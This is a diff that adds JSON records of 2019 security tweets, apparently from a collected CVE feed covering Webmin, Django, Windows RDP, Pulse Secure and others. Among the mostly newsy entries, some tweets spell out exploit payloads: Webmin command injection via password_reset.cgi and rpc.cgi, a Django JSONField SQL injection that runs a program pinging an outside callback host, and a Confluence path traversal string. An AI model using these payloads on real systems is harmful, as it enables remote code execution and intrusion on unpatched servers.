@@ -186,3 +186,191 @@
     "tweeturl": "https://twitter.com/cyber_advising/status/1157797800014426112",
     "username": "cyber_advising"
 }
+{
+    "expanded_url": [
+        "https://twitter.com/yigeban/status/1167323740440424450"
+    ],
+    "tweetfavorites": 129,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 61,
+    "tweettext": "CVE-2019-3394 :  src=\\\"/packages/../web.xml\\\" \n\nfull details analysis: @yigeban  https://t.co/8NdIPTD4Nv https://t.co/duOVOIx7Bn",
+    "tweettime": "2019-08-31, 02:30:45",
+    "tweeturl": "https://twitter.com/chybeta/status/1167625745738301440",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 724,
+    "tweetquotes": 10,
+    "tweetreplies": 11,
+    "tweetretweets": 363,
+    "tweettext": "CVE-2019-15642 another Webmin Remote Code Execution (authenticated)  \n\n1. set User-Agent as webmin  \n2. set Authorization \n3. set payload:\nOBJECT CGI;print \"Content-Type: chybeta\\n\\n\";$cmd=`id`;print \"$cmd\";\n4. post to /rpc.cgi https://t.co/boPYXpLpEv",
+    "tweettime": "2019-08-31, 01:58:16",
+    "tweeturl": "https://twitter.com/chybeta/status/1167617571287289856",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://blog.zecops.com/vulnerabilities/analysis-and-reproduction-of-cve-2019-7286/",
+        "https://blog.zecops.com/vulnerabilities/exploit-of-cve-2019-7286/"
+    ],
+    "tweetfavorites": 56,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "We previously analyzed the (at the time) 0day used in the attacks Google Threat Analysis group revealed today. You can read the technical analysis of CVE-2019-7286 here https://t.co/qxB0epH7Uq and https://t.co/2WvxQcAlD1",
+    "tweettime": "2019-08-30, 19:19:20",
+    "tweeturl": "https://twitter.com/ZecOps/status/1167517173918486528",
+    "username": "ZecOps"
+}
+{
+    "expanded_url": [
+        "https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/"
+    ],
+    "tweetfavorites": 38,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "Further exploitation of CVE-2019-11510 can lead to remote code execution (RCE) on the clients connecting to a compromised Pulse Secure VPN server.\n\nThis technique could be used to spread ransomware and any other type of malware on sensitive networks.\nhttps://t.co/lXcedIyQSB",
+    "tweettime": "2019-08-28, 23:13:34",
+    "tweeturl": "https://twitter.com/bad_packets/status/1166851346143707142",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://cpr-zero.checkpoint.com/vulns/cprid-2132/"
+    ],
+    "tweetfavorites": 220,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 114,
+    "tweettext": "[CPR-Zero] CVE-2019-1159 (Windows 10 Kernel): Use-After-Free in the GetDCEx function in win32kfull.sys.\nhttps://t.co/kg8deEXLnk",
+    "tweettime": "2019-08-20, 13:01:40",
+    "tweeturl": "https://twitter.com/_CPResearch_/status/1163798254145982466",
+    "username": "_CPResearch_"
+}
+{
+    "expanded_url": [
+        "https://chybeta.github.io/2019/08/19/%E3%80%90CVE-2019-15107%E3%80%91-RCE-in-Webmin-1-920-via-password-change/"
+    ],
+    "tweetfavorites": 80,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 23,
+    "tweettext": "fully detailed analysis  for 【CVE-2019-15107】:RCE in Webmin &lt;= 1.920 via password-change\n\nthere is no need to add  a  vertical bar (|)  , we just set our parameter `old` value as `ifconfig`\n\nhttps://t.co/4QA5mCqQRC https://t.co/OPpX8Oxxj8",
+    "tweettime": "2019-08-19, 14:00:03",
+    "tweeturl": "https://twitter.com/chybeta/status/1163450556674797568",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107"
+    ],
+    "tweetfavorites": 253,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 111,
+    "tweettext": "Webmin Unauthenticated Remote Code Execution 0DAY (CVE-2019-15107)\n\nUse #Vulhub# to simply reproduce the vulnerability here:\nhttps://t.co/p7dPv8jYzH https://t.co/0MIRzvr6oh",
+    "tweettime": "2019-08-17, 21:43:18",
+    "tweeturl": "https://twitter.com/phithon_xg/status/1162842364206993408",
+    "username": "phithon_xg"
+}
+{
+    "tweetfavorites": 110,
+    "tweetquotes": 0,
+    "tweetreplies": 2,
+    "tweetretweets": 20,
+    "tweettext": "Made a proof-of-concept testcase for VMWare ESXi + Workstation RCE vulnerability that I have analyzed the patch for previously (CVE-2018-6981, VMSA-2018-0027, USENIX 2019). It's not as easy as it seems at the first glance https://t.co/6Zss9ds8DP",
+    "tweettime": "2019-08-17, 12:01:29",
+    "tweeturl": "https://twitter.com/alisaesage/status/1162695942711083008",
+    "username": "alisaesage"
+}
+{
+    "expanded_url": [
+        "https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html"
+    ],
+    "tweetfavorites": 840,
+    "tweetquotes": 8,
+    "tweetreplies": 6,
+    "tweetretweets": 433,
+    "tweettext": "\"Webmin 0day remote code execution\"\n\nTl;Dr: Lack of input validation in the reset password function  allows RCE (CVE-2019-15107). Over 13 0000 vulnerable on Shodan. \n\nPoC: \n/password_reset.cgi \nuser=root&amp;pam&amp;expired&amp;old=wrong | id\n\nhttps://t.co/kYKfq8v6Bb",
+    "tweettime": "2019-08-17, 11:56:35",
+    "tweeturl": "https://twitter.com/_hg8_/status/1162694712177954819",
+    "username": "_hg8_"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2019/08/windows-rdp-wormable-flaws.html"
+    ],
+    "tweetfavorites": 520,
+    "tweetquotes": 45,
+    "tweetreplies": 10,
+    "tweetretweets": 574,
+    "tweettext": "⚠️ URGENT / Patch Immediately\n\n4 New BlueKeep-like 'Wormable' Remote Desktop RCE Vulnerabilities Discovered in All Supported Versions of #Microsoft Windows OS\n\nRead Here ➤ https://t.co/ss2OWBRxDL\n\n✅ CVE-2019-1181\n✅ CVE-2019-1182\n✅ CVE-2019-1222\n✅ CVE-2019-1226 https://t.co/L1OP88yJEX",
+    "tweettime": "2019-08-13, 18:26:21",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1161343245722349568",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://zero.lol/2019-08-11-the-year-of-linux-on-the-desktop/"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 18,
+    "tweettext": "The Year of Linux on the Desktop (CVE-2019-14744). \nFeaturing a command injection bug in KDE 4 and 5.\n\nhttps://t.co/ddCoXUcau4\n\n#security #bugbounty #bugbountytips #redteam #0day #exploit #security #kde #zerodotlol #zerolol #analysis #poc",
+    "tweettime": "2019-08-12, 21:10:36",
+    "tweeturl": "https://twitter.com/zer0pwn/status/1161022192638935040",
+    "username": "zer0pwn"
+}
+{
+    "expanded_url": [
+        "https://paper.seebug.org/1010/",
+        "https://medium.com/@knownsec404team/analysis-of-apache-solr-dataimporthandler-remote-code-execution-vulnerability-cve-2019-0193-2ce32e68d868"
+    ],
+    "tweetfavorites": 41,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 25,
+    "tweettext": "Analysis of Apache Solr DataImportHandler Remote Code Execution Vulnerability (CVE-2019-0193) is out now.  Learn more on Seebug Paper: https://t.co/0eNWDwceeF and Medium: https://t.co/wycw3zQpgz",
+    "tweettime": "2019-08-12, 10:02:24",
+    "tweeturl": "https://twitter.com/seebug_team/status/1160854035097968640",
+    "username": "seebug_team"
+}
+{
+    "tweetfavorites": 53,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 8,
+    "tweettext": "When I analyzed CVE-2019-0887, bug in RDP's clipboard feature. Copy file between client and server, \"mstsc.exe\" did not check the file path in FILEDESCRIPTOR structure, leading to Path-Traversal vulnerability. However, I found a more interesting feature :P https://t.co/apVxga3cfx",
+    "tweettime": "2019-08-08, 14:17:57",
+    "tweeturl": "https://twitter.com/linhlhq/status/1159468796479823873",
+    "username": "linhlhq"
+}
+{
+    "expanded_url": [
+        "http://xxx.ceye.io"
+    ],
+    "tweetfavorites": 305,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 158,
+    "tweettext": "EXP for CVE-2019-14234 Django JSONField SQL Injection  \nStep1:\n\n?data__breed'%3f'a') OR 1%3d2 %3bCREATE table cmd_exec(cmd_output text) -- OR  ....\n\nStep2:\n?data__breed'%3f'a') OR 1%3d2 %3bCOPY cmd_exec FROM PROGRAM 'ping https://t.co/QSKdevS9Dt' -- OR  ... https://t.co/YMWa7GNUl2",
+    "tweettime": "2019-08-08, 00:33:56",
+    "tweeturl": "https://twitter.com/chybeta/status/1159261425279234048",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html"
+    ],
+    "tweetfavorites": 83,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 37,
+    "tweettext": "CVE-2019-14234 : Python Web Framework Django JSONField SQL Injection\n\nhttps://t.co/xIiz8sjkpG https://t.co/AsmpWgi7tW",
+    "tweettime": "2019-08-03, 23:38:01",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1157797800014426112",
+    "username": "cyber_advising"
+}
